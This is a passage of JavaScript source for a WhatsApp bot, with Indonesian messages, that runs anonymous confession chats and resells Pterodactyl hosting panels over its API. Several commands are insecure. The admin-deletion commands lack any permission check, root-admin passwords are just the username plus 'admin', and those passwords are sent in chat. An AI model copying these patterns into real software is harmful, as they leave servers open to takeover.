await rafatharcode.sendMessage(other, {text: `@${m.sender.split("@")[0]} telah menerima menfess mu, sekarang kamu bisa chatan lewat bot ini!\n\n*NOTE:* Ketik ${prefix}stopmenfess untuk stop`, mentions: [m.sender]})
rafatharcode.sendMessage(m.chat, {text: `Menfess telah siterima, sekarang kamu bisa chatan lewat bot ini!\n\n*NOTE:* Ketik ${prefix}stopmenfess untuk stop`})
}
break

case 'tolakconfess':
case 'tolakmenfess': {
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return m.reply("Belum ada sesi menfess aebelumnya!")
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
rafatharcode.sendMessage(other, {text: `${m.sender.split("@")[0]} menolak menfess dari mu...`, mentions: [m.sender]})
// await rafatharcode.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
m.reply('Menfess berhasil ditolak!')
delete this.menfes[roof.id]
}
break

case 'stopconfess':
case 'stopmenfess': {
 //find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return m.reply("Belum ada sesi menfess sebelumnya!")
const to = find.a == m.sender ? find.b : find.a
rafatharcode.sendMessage(to, {text: `Teman chat telah menghentikan menfess ini...`, mentions:[m.sender]})
await m.reply('Menfess berhasil distop!')
delete this.menfes[find.id]
}
break

// === Cpanel Menu

case 'listserver': {
if (!isOwner && !isReseller) return onlyOr()
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut list server nya:\n\n";
for (let server of servers) {
let s = server.attributes; 
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `ID server: ${s.id}\n`;
messageText += `Nama server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total server: ${res.meta.pagination.count}`;
await rafatharcode.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break

case 'listserver-v2': {
if (!isOwner && !isReseller2) return onlyOr()
let page = args[0] ? args[0] : '1';
let f = await fetch(domain2 + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut list server nya:\n\n";
for (let server of servers) {
let s = server.attributes; 
let f3 = await fetch(domain2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey2
}
});
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `ID server: ${s.id}\n`;
messageText += `Nama server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total server: ${res.meta.pagination.count}`;
await rafatharcode.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break

case 'delserver': {
if (!isOwner && !isReseller) return onlyOr()
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server tidak ditemukan!')
m.reply('Sukses menghapus server!')
}
break

case 'delserver-v2': {
if (!isOwner && !isReseller2) return onlyOr()
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain2 + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server tidak ditemukan!')
m.reply('Sukses menghapus server!')
}
break

case 'listuser': {
if (!isOwner && !isReseller) return onlyOr()
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let users = res.data;
let messageText = "Berikut list user nya:\n\n";
for (let user of users) {
let u = user.attributes;
messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total user: ${res.meta.pagination.count}`;
await rafatharcode.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break

case 'listuser-v2': {
if (!isOwner && !isReseller) return onlyOr()
let page = args[0] ? args[0] : '1';
let f = await fetch(domain2 + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
});
let res = await f.json();
let users = res.data;
let messageText = "Berikut list user nya:\n\n";
for (let user of users) {
let u = user.attributes;
messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total user: ${res.meta.pagination.count}`;
await rafatharcode.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break

case 'deluser': {
if (!isOwner && !isReseller) return onlyOr()
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('User tidak ditemukan!')
m.reply('Sukses menghapus user!')
}
break

case 'deluser-v2': {
if (!isOwner && !isReseller) return onlyOr()
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
let f = await fetch(domain2 + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('User tidak ditemukan!')
m.reply('Sukses menghapus user!')
}
break

case 'cadmin': {
if (!isOwner && !isOwner2) return onlyOwn()
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return rafatharcodereply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return rafatharcodereply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return rafatharcodereply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "admin"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}`
    const listMessage = {

        text: tks,

    }

	

    await rafatharcode.sendMessage(m.chat, listMessage)

    await rafatharcode.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

👤USERNAME :  ${username}
🔑PASSWORD: ${password}
🌐LOGIN: ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*

© RafatharCode
`,

    })

} 
break

case 'cadmin-v2': {
if (!isOwner && !isOwner2) return onlyOwn()
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return rafatharcodereply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return rafatharcodereply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return rafatharcodereply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "admin"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}`
    const listMessage = {

        text: tks,

    }

	

    await rafatharcode.sendMessage(m.chat, listMessage)

    await rafatharcode.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

👤USERNAME :  ${username}
🔑PASSWORD: ${password}
🌐LOGIN: ${domain2}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*

© RafatharCode
`,

    })

} 
break

case 'addadmin': {
if (!isOwner && !isOwner2) return onlyOwn()
let t = text.split(',');
if (t.length < 3) return m.reply(`Contoh: ${prefix+command} email,username,name,nomor`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`Contoh: ${prefix+command} email,username,name,nomor`);
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username +"admin"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
m.reply(`${monospace("BERHASIL CADMIN!")}
• ID: ${user.id}
• UUID: ${user.uuid}
• Email: ${user.email}

Data lainnya sudah terkirim ke
privat chat...`)
let teksnyo = `*BERIKUT DATA ADMIN PANEL ANDA* `+readmore+`

• ID: ${user.id}
• UUID: ${user.uuid}
• Email: ${user.email}
• Username: ${user.username}
• Password: ${password.toString()}
• Link Group: ${linkgcpanel}

Simpan data admin panel baik-baik
Karna admin hanya 1 kali kirim data admin panel.
Jangan lupa join group panel!!`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teksnyo
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY LINK GROUP",
"copy_code": `${linkgcpanel}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `Channel ${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
}
break

case 'addadmin-v2': {
if (!isOwner) return onlyOwn()
let t = text.split(',');
if (t.length < 3) return m.reply(`Contoh: ${prefix+command} email,username,name,nomor`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`Contoh: ${prefix+command} email,username,name,nomor`);
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username +"admin"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
m.reply(`${monospace("BERHASIL CADMIN!")}
• ID: ${user.id}
• UUID: ${user.uuid}
• Email: ${user.email}

Data lainnya sudah terkirim ke
privat chat...`)
let teksnyo = `*BERIKUT DATA ADMIN PANEL ANDA* `+readmore+`

• ID: ${user.id}
• UUID: ${user.uuid}
• Email: ${user.email}
• Username: ${user.username}
• Password: ${password.toString()}
• Link Group: ${linkgcpanel}

Simpan data admin panel baik-baik
Karna admin hanya 1 kali kirim data admin panel.
Jangan lupa join group panel!!`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teksnyo
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain2}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY LINK GROUP",
"copy_code": `${linkgcpanel}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `Channel ${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
}
break

case 'deladmin': {
if (!args[0]) return m.reply(`Untuk melihat ID silahkan ketik ${prefix}listadmin`)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID admin tidak ditemukan!")
m.reply(`Berhasil del admin panel *${capital(getid)}*`)
}
break

case 'deladmin-v2': {
if (!args[0]) return m.reply(`Untuk melihat ID silahkan ketik ${prefix}listadmin2`)
let cek = await fetch(domain2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID admin tidak ditemukan!")
m.reply(`Berhasil del admin panel *${capital(getid)}*`)
}
break

case 'listadmin': {
if (!isOwner) return onlyOwn()
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}});
let res = await f.json();
let users = res.data;
let messageText = "Berikut List Admin:\n\n";
for (let user of users) {
let u = user.attributes;
if (u.root_admin) {
messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total: ${res.meta.pagination.count}`;
await rafatharcode.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break

case 'listadmin-v2': {
if (!isOwner) return onlyOwn()
let page = args[0] ? args[0] : '1';
let f = await fetch(domain2 + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}});
let res = await f.json();
let users = res.data;
let messageText = "Berikut List Admin:\n\n";
for (let user of users) {
let u = user.attributes;
if (u.root_admin) {
messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total: ${res.meta.pagination.count}`;
await rafatharcode.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break

case 'listadmin-prib': {
if (!isOwner) return onlyOwn()
let page = args[0] ? args[0] : '1';
let f = await fetch(domain_prib + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey_prib
}});
let res = await f.json();
let users = res.data;
let messageText = "Berikut List Admin:\n\n";
for (let user of users) {
let u = user.attributes;
if (u.root_admin) {
messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total: ${res.meta.pagination.count}`;
await rafatharcode.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break

case '1gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1150"
let cpu = "30"
let disk = "1150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES  CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '1gb-v2': {
if (!isOwner && !isReseller2) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1150"
let cpu = "30"
let disk = "1150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain2}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '2gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
